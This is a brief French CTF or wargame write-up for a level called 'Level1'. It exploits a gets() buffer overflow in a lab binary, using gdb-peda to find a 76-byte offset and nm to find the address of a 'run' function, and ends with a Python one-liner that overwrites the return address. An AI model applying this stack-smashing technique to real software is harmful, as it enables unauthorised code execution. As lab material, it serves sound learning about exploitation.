# Level1

- Il y a une faille. Get n'a pas de limite de longeur et la variable input fait seulement 75 de longeur
- Donc en marquant assez de caractere on peut overwrite la return Address
- On voit que dans gdb la return address est overwrite par le contenu du gets
<pre>
$> gdb ./level1 
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r < <(echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EIP: 0x41344141 ('AA4A')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41344141
[------------------------------------stack-------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41344141 in ?? ()
gdb-peda$ pattern offset 'AA4A'
<strong>AA4A found at offset: 76</strong>
</pre>
- On recupere l'addresse de la fonction run
<pre>
$> nm ./level1 
         U __libc_start_main@@GLIBC_2.0
08048480 T main
<strong>08048444</strong> T run
08048390 T \_start
</pre>
- Il ne reste plus qu'a executé la commande
```
(python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
```
